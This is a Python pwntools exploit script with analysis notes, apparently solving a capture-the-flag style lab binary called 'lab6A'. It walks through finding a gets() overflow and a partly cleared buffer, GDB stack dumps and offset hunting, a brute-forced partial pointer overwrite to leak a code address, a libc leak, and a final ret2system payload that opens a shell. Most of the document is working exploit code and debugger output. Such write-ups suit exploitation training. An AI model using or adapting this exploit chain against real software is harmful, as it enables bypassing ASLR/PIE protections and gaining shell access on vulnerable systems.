# -*- coding: utf-8 -*-

# Security NX/ASLR/PIE/RELRO - ON
'''
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
'''

# Potential entry points (code analysis):
''' 1st issue - desc is badly initialized
struct uinfo {
    char name[32];
    char desc[128];  <==
    unsigned int sfunc;
}user;

    // Initialize user info
    memset(merchant.name, 0, 32);
    memset(merchant.desc, 0 , 64); <== Only 64 bytes of 128 were cleared
    merchant.sfunc = (unsigned int)print_listing;
'''

''' 2nd issue - gets is being used
void make_note() {
    char note[40]; <==
    printf("Make a Note About your listing...: ");
    gets(note);
}

BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters
       gets()  will  read,  and because gets() will continue to store characters past the end of the buffer, it is
       extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
'''

''' 3rd issues - unused functions
* make_note
* print_name
* write_wrap
'''

# Manual testing in GDB:
''' 1st issue - 32B name exception
Enter Choice: 1
Enter your name: 32 x A...
'''

''' 2nd issue - 128B desc - infinite loop
Enter Choice: 1
Enter your name: name < 32B
Enter your description: = 128B

'''

# Stack @ memcyp() - after mecpy of name which was 8 x A => 0x41 | desc was 64 x B and 64 x C
''' b *0x5655667e
gdb-peda$ x/144wx $esp
=> 0x5655667e <setup_account+264>:      call   0x56556180 <memcpy@plt

0xffffccd0:     0xffffcdcb      0xffffcce0      0x00000090      0x5655658b
0xffffcce0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffccf0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd00:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd10:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd20:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd30:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd40:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd50:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd60:     0xf7fa7d20      0x56557280      0xffffcd84      0x56558f9c
0xffffcd70:     0xf7fa7000      0xf7fa7000      0xffffce48      0x565567f3
0xffffcd80:     0xffffcd9c      0xf7fa7000      0xffffce48      0x565567c8 <== RET to main
0xffffcd90:     0x00000000      0x00000000      0x00000031      0x41414141 <== name - before copy
0xffffcda0:     0x41414141      0x0000000a      0x00000000      0x00000000
0xffffcdb0:     0x00000000      0x00000000      0x00000000      0x41414141 <== name - after copy
0xffffcdc0:     0x41414141      0x7369200a      0x00206120      0x00000000 <
0xffffcdd0:     0x00000000      0x00000000      0x00000000      0x00000000 <
0xffffcde0:     0x00000000      0x00000000      0x00000000      0x00000000 <
0xffffcdf0:     0x00000000      0x00000000      0x00000000      0xf7fa5a80 <<= 54B of cleared space for, where are 10B ? 
0xffffce00:     0x00000000      0xf7fa7000      0xf7ffc7e0      0xf7faac68 <
0xffffce10:     0xf7fa7000      0xf7fe22f0      0x00000000      0xf7df4402
0xffffce20:     0xf7fa73fc      0x00000001      0x56558f9c  <   0x565568e3 <== probably RET
0xffffce30:     0x00000001      0xffffcef4      0xffffcefc      0x56556487 <== print_listing()
0xffffce40:     0xffffce60      0x00000000      0x00000000      0xf7ddaee5
0xffffce50:     0xf7fa7000      0xf7fa7000      0x00000000      0xf7ddaee5
0xffffce60:     0x00000001      0xffffcef4      0xffffcefc      0xffffce84
0xffffce70:     0xf7fa7000      0xf7ffd000      0xffffced8      0x00000000
0xffffce80:     0xf7ffd990      0x00000000      0xf7fa7000      0xf7fa7000
0xffffce90:     0x00000000      0xf6b24416      0xb273c206      0x00000000
0xffffcea0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffceb0:     0x00000000      0x00000000      0xf7fe219d      0x56558f9c
0xffffcec0:     0x00000001      0x56556230      0x00000000      0x56556265
0xffffced0:     0x565566c2      0x00000001      0xffffcef4      0x56556890
0xffffcee0:     0x56556900      0xf7fe22f0      0xffffceec      0x0000001c
0xffffcef0:     0x00000001      0xffffd0e0      0x00000000      0xffffd0fe
0xffffcf00:     0xffffd10d      0xffffd121      0xffffd157      0xffffd19d
'''

# Stack @ one instruction after memcpy()
''' b *0x56556683
gdb-peda$ x/144wx $esp
0xffffccd0:     0xffffcdcb      0xffffcce0      0x00000090      0x5655658b
0xffffcce0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffccf0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd00:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd10:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcd20:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd30:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd40:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd50:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcd60:     0xf7fa7d20      0x56557280      0xffffcd84      0x56558f9c
0xffffcd70:     0xf7fa7000      0xf7fa7000      0xffffce48      0x565567f3
0xffffcd80:     0xffffcd9c      0xf7fa7000      0xffffce48      0x565567c8
0xffffcd90:     0x00000000      0x00000000      0x00000031      0x41414141
0xffffcda0:     0x41414141      0x0000000a      0x00000000      0x00000000
0xffffcdb0:     0x00000000      0x00000000      0x00000000      0x41414141
0xffffcdc0:     0x41414141      0x7369200a      0x42206120      0x42424242
0xffffcdd0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcde0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffcdf0:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffce00:     0x42424242      0x42424242      0x43424242      0x43434343
0xffffce10:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce20:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce30:     0x43434343      0x43434343      0x43434343      0x43434343 
0xffffce40:     0x43434343      0x43434343      0x20434343      0x80f7fa7d
0xffffce50:     0x84565572      0x9cffffcd      0x0056558f      0xf7ddaee5
0xffffce60:     0x00000001      0xffffcef4      0xffffcefc      0xffffce84
0xffffce70:     0xf7fa7000      0xf7ffd000      0xffffced8      0x00000000
0xffffce80:     0xf7ffd990      0x00000000      0xf7fa7000      0xf7fa7000
0xffffce90:     0x00000000      0xf6b24416      0xb273c206      0x00000000
0xffffcea0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffceb0:     0x00000000      0x00000000      0xf7fe219d      0x56558f9c
0xffffcec0:     0x00000001      0x56556230      0x00000000      0x56556265
0xffffced0:     0x565566c2      0x00000001      0xffffcef4      0x56556890
0xffffcee0:     0x56556900      0xf7fe22f0      0xffffceec      0x0000001c
0xffffcef0:     0x00000001      0xffffd0e0      0x00000000      0xffffd0fe
0xffffcf00:     0xffffd10d      0xffffd121      0xffffd157      0xffffd19d
'''

# Control EIP by overwriting RET using description in option (1) and then use option (4) to exit. (cyclic 128)
''' EIP is @ 94 aaya => ]aya  
( there is substraction from first byte of ESP - 4, i checked it with another string, whcich result in sivseg ESP = 'AEEF')
>>> (ord('A') - ord('E'))
-4
>>> (ord(']') - ord('a'))
-4

Enter Choice: 4

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x617a6161 ('aaza')
ECX: 0x61796161 ('aaya')
EDX: 0x0 
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0x61626261 ('abba')
ESP: 0x6179615d (']aya')
EIP: 0x5655687d (<main+443>:    ret)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556878 <main+438>:       pop    ebx
   0x56556879 <main+439>:       pop    ebp
   0x5655687a <main+440>:       lea    esp,[ecx-0x4]
=> 0x5655687d <main+443>:       ret    
   0x5655687e <__x86.get_pc_thunk.ax>:  mov    eax,DWORD PTR [esp]
   0x56556881 <__x86.get_pc_thunk.ax+3>:        ret    
   0x56556882 <__x86.get_pc_thunk.ax+4>:        xchg   ax,ax
   0x56556884 <__x86.get_pc_thunk.ax+6>:        xchg   ax,ax
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x6179615d
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x5655687d in main ()

'''
# I could exploit it with +4, but i have found that there is EIP overwrite by using 3rd option instead:
''' EIP is @ 119
Enter Choice: 3

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcd9c --> 0xa6478 ('xd\n')
EBX: 0x56558f9c --> 0x3ea4 
ECX: 0xffffcd98 --> 0x33 ('3')
EDX: 0x61616662 ('bfaa')
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0xffffce48 --> 0x557280f7 
ESP: 0xffffcd7c ("DhUV\234\315\377\377")
EIP: 0x61616662 ('bfaa')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61616662
[------------------------------------stack-------------------------------------]
0000| 0xffffcd7c ("DhUV\234\315\377\377")
0004| 0xffffcd80 --> 0xffffcd9c --> 0xa6478 ('xd\n')
0008| 0xffffcd84 --> 0xf7fa7000 --> 0x1ead6c 
0012| 0xffffcd88 --> 0xffffce48 --> 0x557280f7 
0016| 0xffffcd8c --> 0x565567c8 (<main+262>:    movzx  edx,BYTE PTR [ebp-0xb0])
0020| 0xffffcd90 --> 0x0 
0024| 0xffffcd94 --> 0x0 
0028| 0xffffcd98 --> 0x33 ('3')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61616662 in ?? ()
'''

# Try to redirect the output to make_note()
''' b * 0x5655644a
python -c 'from pwn import *; print "A" * 119 + p32(0x5655644a)'

gdb-peda$ c
Continuing.
Enter Choice: 3
[----------------------------------registers-----------------------------------]
EAX: 0xffffcd9c --> 0xa6478 ('xd\n')
EBX: 0x56558f9c --> 0x3ea4 
ECX: 0xffffcd98 --> 0x33 ('3')
EDX: 0x5655644a (<make_note>:   endbr32)
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0xffffce48 --> 0x0 
ESP: 0xffffcd7c ("DhUV\234\315\377\377")
EIP: 0x5655644a (<make_note>:   endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556445 <write_wrap+45>:  mov    ebx,DWORD PTR [ebp-0x4]
   0x56556448 <write_wrap+48>:  leave  
   0x56556449 <write_wrap+49>:  ret    
=> 0x5655644a <make_note>:      endbr32 
   0x5655644e <make_note+4>:    push   ebp
   0x5655644f <make_note+5>:    mov    ebp,esp
   0x56556451 <make_note+7>:    push   ebx
   0x56556452 <make_note+8>:    sub    esp,0x34
[------------------------------------stack-------------------------------------]
0000| 0xffffcd7c ("DhUV\234\315\377\377")
0004| 0xffffcd80 --> 0xffffcd9c --> 0xa6478 ('xd\n')
0008| 0xffffcd84 --> 0xf7fa7000 --> 0x1ead6c 
0012| 0xffffcd88 --> 0xffffce48 --> 0x0 
0016| 0xffffcd8c --> 0x565567c8 (<main+262>:    movzx  edx,BYTE PTR [ebp-0xb0])
0020| 0xffffcd90 --> 0x0 
0024| 0xffffcd94 --> 0x0 
0028| 0xffffcd98 --> 0x33 ('3')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x5655644a in make_note ()
gdb-peda$ c
Continuing.
Make a Note About your listing...:
'''
# There is buffer overflow vuln as predicted:
''' EIP is @ 52 
Stopped reason: SIGSEGV
0x6161616e in ?? ()
'''
# Last piece is to leak the address of any function, there is unused print_name()
''' 
void print_name(struct uinfo * info) {
    printf("Username: %s\n", info->name);
}

gdb-peda$ p print_name
$1 = {<text variable, no debug info>} 0x168f <print_name> <== 0x168f
gdb-peda$ p print_name
$2 = {<text variable, no debug info>} 0x5655668f <print_name> 
'''
# To use it, i can partial overwrite the last 2 bytes of the print_listing() - so basically brute force last 2 bytes.

# The plan is to:
# 1. Leak the addres of any function - by partial overwrite.
''' 31 x "A" + 90 x "B" + "\x8f\x16\x00" - \x00 to cut the 0x0a - enter ''' 
'''
[DEBUG] Received 0xc1 bytes:
    00000000  55 73 65 72  6e 61 6d 65  3a 20 41 41  41 41 41 41  │User│name│: AA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 0a 41 41  41 41 41 41  │AAAA│AAAA│A·AA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000040  41 41 41 41  41 41 41 41  41 0a 20 69  73 20 61 20  │AAAA│AAAA│A· i│s a │
    00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000a0  41 41 41 41  41 41 41 41  41 41 8f 66  55 56 b0 ce  │AAAA│AAAA│AA·f│UV··│  <== 8f 66  55 56  [aa:ad]
    000000b0  ff ff 0a 45  6e 74 65 72  20 43 68 6f  69 63 65 3a  │···E│nter│ Cho│ice:│
    000000c0  20                                                  │ │
    000000c1
'''
# 2. Leak the libc address by calling setup_account again - this will leak more bytes from the stack, because of memcpy()
'''
gdb-peda$ vmmap libc
Start      End        Perm	Name
0xf7d43000 0xf7d60000 r--p	/usr/lib/i386-linux-gnu/libc-2.31.so
0xf7d60000 0xf7ebb000 r-xp	/usr/lib/i386-linux-gnu/libc-2.31.so <==
0xf7ebb000 0xf7f2b000 r--p	/usr/lib/i386-linux-gnu/libc-2.31.so
0xf7f2b000 0xf7f2c000 ---p	/usr/lib/i386-linux-gnu/libc-2.31.so
0xf7f2c000 0xf7f2e000 r--p	/usr/lib/i386-linux-gnu/libc-2.31.so
0xf7f2e000 0xf7f30000 rw-p	/usr/lib/i386-linux-gnu/libc-2.31.so

[DEBUG] Received 0xcd bytes:
    00000000  55 73 65 72  6e 61 6d 65  3a 20 42 0a  41 41 41 41  │User│name│: B·│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 0a 42 0a  41 41 41 41  │AAAA│AAAA│A·B·│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000040  41 41 41 41  41 41 41 41  41 0a 20 69  73 20 61 20  │AAAA│AAAA│A· i│s a │
    00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000a0  41 41 41 41  41 41 41 41  41 41 8f 66  57 56 20 f5  │AAAA│AAAA│AA·f│WV ·│
    000000b0  ba ff 20 69  73 20 61 20  42 0a e5 1e  d6 f7 0a 45  │·· i│s a │B···│···E│ <== 0xf7d60000  <== e5 1e  d6 f7 => 0xf7d61ee5
    000000c0  6e 74 65 72  20 43 68 6f  69 63 65 3a  20           │nter│ Cho│ice:│ │
'''
# 3. Calculate the relative addr of base libc 
'''
>>> hex(0xf7d61ee5 - 0xf7d60000)
'0x1ee5'
'''
# 4. Calculate system() and "/bin/sh"
'''
    system_addr = base_libc_addr + 0x28830
    bin_sh_addr = base_libc_addr + 0x175352
'''
# 5. Exploit overflow again using ret2system with leaked addresses
''' Because of memcpy the EIP offset has changed - sending 32 x "A" - as name - and cyclic 123 - as desc and using (4) option - 4: Exit
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x20736920 (' is ')
ECX: 0xff921030 ("aadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
EDX: 0x0 
ESI: 0xf7f8b000 --> 0x1ead6c 
EDI: 0xf7f8b000 --> 0x1ead6c 
EBP: 0xa422061 ('a B\n')
ESP: 0xff921030 ("aadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
EIP: 0x61636161 ('aaca')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61636161
[------------------------------------stack-------------------------------------]
0000| 0xff921030 ("aadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0004| 0xff921034 ("aaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0008| 0xff921038 ("aafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0012| 0xff92103c ("aagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0016| 0xff921040 ("aahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0020| 0xff921044 ("aaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0024| 0xff921048 ("aajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
0028| 0xff92104c ("aakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaa\nYV\001")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61636161 in ?? ()

❯ cyclic -l aaca
6
'''


# Exploit code
from pwn import *
#context.log_level = 'debug'

def ret2print_name():
    '''Leak any function addr using buffer overflow and redirect the execution flow to unused print_name() which leaks bytes till the 0x00 byte'''
    p.sendlineafter("Enter Choice: ","1")
    name = "A" * 31
    p.sendlineafter("Enter your name: ",name)
    desc = "A" * 90 + p16(0x668f) + "\x00"
    p.sendlineafter("Enter your description: ",desc)
    p.sendlineafter("Enter Choice: ","3")
    # Actual leak of print_name() - thus .text segment
    leak = p.recvuntil("Enter Choice: ")
    ret = u32(leak[0xaa:0xae])
    log.info("Leak of print_name() : " + str(hex(ret)))
    return ret


def leaklibc(ret):
    '''Leak libc address - by calling setup_account again'''
    p.sendline("1")
    name = "B"
    p.sendlineafter("Enter your name: ",name)
    desc = "B" 
    p.sendlineafter("Enter your description: ",desc)
    p.sendlineafter("Enter Choice: ","3")
    # Actual leak of __libc_start_main+245 - thus libc base address
    leak = p.recvuntil("Enter Choice: ")
    ret = u32(leak[0xba:0xbe])
    base_libc_addr = ret - 0x1ee5
    log.info("Leak of libc base_addr: " + str(hex(base_libc_addr)))
    return base_libc_addr


def calculate_relative(base_libc_addr):
    '''Calculate addresses of system() and "/bin/sh" '''
    system_addr = base_libc_addr + 0x28830
    bin_sh_addr = base_libc_addr + 0x175352
    log.info("Leak of system() addr: " + str(hex(system_addr)))
    log.info("Leak of '/bin/sh' addr: " + str(hex(bin_sh_addr)))
    return system_addr, bin_sh_addr


def ret2system(system_addr,bin_sh_addr):
    '''Exploit print_name() again with leaked system_addr and /bin/sh '''
    p.sendline("1")
    name = "C" * 31
    p.sendlineafter("Enter your name: ",name)
    desc = "C" * 6 + p32(system_addr) + "HEHE" + p32(bin_sh_addr)
    p.sendlineafter("Enter your description: ",desc)
    p.sendlineafter("Enter Choice: ","4")


# Loop till the leak
while(True):
    ret = 0
    try:
        p = process("./lab6A")
        ret = ret2print_name()
    except:
        pass

    if hex(ret)[6:10] == "668f":
        break


base_libc_addr = leaklibc(ret)
system_addr, bin_sh_addr = calculate_relative(base_libc_addr)
ret2system(system_addr,bin_sh_addr)

p.interactive()